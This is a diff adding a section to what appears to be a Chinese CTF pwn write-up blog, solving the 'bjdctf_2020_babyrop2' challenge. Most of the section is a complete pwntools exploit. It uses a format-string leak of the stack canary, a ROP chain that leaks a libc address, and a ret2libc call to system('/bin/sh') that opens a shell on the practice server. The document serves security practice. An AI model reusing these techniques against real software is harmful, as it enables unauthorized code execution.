@@ -226,3 +226,41 @@ p.interactive()
 #### [V&N2020 公开赛]simpleHeap
 
 [传送门]({{ site.url }}/blog/buuoj-pwn-heap-vn_pwn_simpleHeap/)
+
+### bjdctf_2020_babyrop2
+题目里面有一个各式字符串漏洞可以输出canary。由于64bit系统前6个参数通过寄存器传递，这个地方需要输出第7个参数的话要用上一点[技巧](https://stackoverflow.com/a/44192302/8706476)
+```python
+#!/usr/bin/python3.6
+from pwn import *
+from LibcSearcher import LibcSearcher
+
+filename = './bjdctf_2020_babyrop2'
+#p = process(filename)
+p = remote('node3.buuoj.cn', 29094)
+elf = ELF(filename)
+#libc = ELF(f'/lib/x86_64-linux-gnu/libc.so.6')
+#libc = ELF(f'libc/ubuntu_16_x86_64_libc-2.23.so')
+
+p.sendlineafter(b"I'll give u some gift to help u!\n", b'%7$lx')
+canary = int(p.recvuntil(b'\n')[:-1], 16)
+assert canary > 0
+log.success(f'canary found: {hex(canary)}')
+
+pop_rdi_ret = 0x0000000000400993
+
+leak = b'\x11'*(0x20-8) + p64(canary) + b'\x22'*8 + p64(pop_rdi_ret) + p64(elf.got['__isoc99_scanf']) + p64(elf.plt['printf']) + p64(elf.sym['vuln'])
+p.sendlineafter(b'Pull up your sword and tell me u story!\n', leak)
+ret = p.recv(6).ljust(8, b'\x00')
+c_func_addr = u64(ret)
+c_func_name = '__isoc99_scanf'
+searcher = LibcSearcher(func=c_func_name, address=c_func_addr)
+
+base = c_func_addr - searcher.dump(c_func_name)
+system = base + searcher.dump('system')
+bin_sh = base + searcher.dump('str_bin_sh')
+log.success(f'{c_func_name}:{hex(c_func_addr)}, base={hex(base)}, system={hex(system)}, /bin/sh={hex(bin_sh)}')
+
+exploit = b'\x11'*(0x20-8) + p64(canary) + b'\x22'*8 + p64(pop_rdi_ret) + p64(bin_sh) + p64(system)
+p.sendline(exploit)
+p.interactive()
+```
